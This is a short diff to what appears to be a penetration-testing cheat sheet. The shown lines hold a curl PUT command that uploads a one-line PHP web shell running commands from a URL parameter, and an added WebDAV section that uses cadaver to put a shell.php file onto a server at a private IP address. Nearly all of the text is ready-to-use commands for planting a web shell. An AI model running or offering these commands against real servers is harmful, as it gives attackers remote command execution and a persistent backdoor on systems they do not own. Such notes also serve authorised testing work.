@@ -32,3 +32,9 @@ pdftotext *.pdf
 ```
  curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.ph
 ```
+
+### Webdav
+```
+cadaver http://192.168.1.103/dav/
+ put /tmp/shell.php
+```
